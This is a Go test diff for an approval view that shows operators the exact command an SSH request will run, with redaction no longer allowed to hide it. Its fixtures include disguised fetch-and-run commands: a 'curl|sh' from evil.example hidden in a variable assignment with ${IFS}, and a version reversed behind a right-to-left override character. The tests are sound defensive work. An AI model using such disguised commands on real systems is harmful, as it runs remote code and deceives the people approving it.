@@ -6,6 +6,7 @@ import (
 	"errors"
 	"path/filepath"
 	"slices"
+	"strconv"
 	"strings"
 	"testing"
 
@@ -95,5 +96,45 @@ func TestWhatAnApprovalShowsIsBounded(t *testing.T) {
 	}
 	if renderShown(redact.NewScope(), nil, nil) != nil {
 		t.Fatal("an empty view was stored")
+	}
+}
+
+// The approver sees the command that will run (B4). The text rules used to
+// rewrite the requester's own text, so a command substitution disguised as
+// an assignment rendered as "CACHE_TOKEN=[REDACTED] systemctl restart
+// nginx" while the approval bound the real plan: the operator approved
+// curl | sh without seeing it. It is now shown as it will run, and flagged.
+func TestAnApprovalShowsTheCommandThatWillRun(t *testing.T) {
+	command := "CACHE_TOKEN=$(curl${IFS}-s${IFS}http://evil.example/x|sh) systemctl restart nginx"
+	p := &plan.Plan{Connector: "ssh", Operation: "exec", Preview: json.RawMessage(`{"command":` + strconv.Quote(command) + `}`)}
+	shown := renderShown(redact.NewScope(), p, map[string]any{"command": command, "id": "prod-api"})
+	var args map[string]any
+	if err := json.Unmarshal(shown.Arguments, &args); err != nil || args["command"] != command {
+		t.Fatalf("the arguments shown are not the command that will run: %s", shown.Arguments)
+	}
+	var rendered plan.Plan
+	if err := json.Unmarshal(shown.Plan, &rendered); err != nil {
+		t.Fatal(err)
+	}
+	var preview map[string]any
+	if err := json.Unmarshal(rendered.Preview, &preview); err != nil || preview["command"] != command {
+		t.Fatalf("the plan shown is not the plan that will run: %s", rendered.Preview)
+	}
+	for _, ptr := range []string{"/arguments/command", "/plan/preview/command"} {
+		if !slices.Contains(shown.Flagged, ptr) {
+			t.Errorf("%s is not flagged: %v", ptr, shown.Flagged)
+		}
+	}
+	if strings.Contains(string(shown.Arguments)+string(shown.Plan), redact.Marker) {
+		t.Fatalf("something the requester wrote was rewritten: %s %s", shown.Arguments, shown.Plan)
+	}
+}
+
+// A character that hides or reorders text is shown escaped and flagged, so
+// the command reads as it runs.
+func TestAnApprovalShowsInvisibleCharactersEscaped(t *testing.T) {
+	shown := renderShown(redact.NewScope(), nil, map[string]any{"command": "echo safe\u202e;hs|x/elpmaxe.live//:ptth lruc"})
+	if strings.Contains(string(shown.Arguments), "\u202e") || !strings.Contains(string(shown.Arguments), `\\u202E`) || !slices.Contains(shown.Flagged, "/arguments/command") {
+		t.Fatalf("shown %s flagged %v", shown.Arguments, shown.Flagged)
 	}
 }
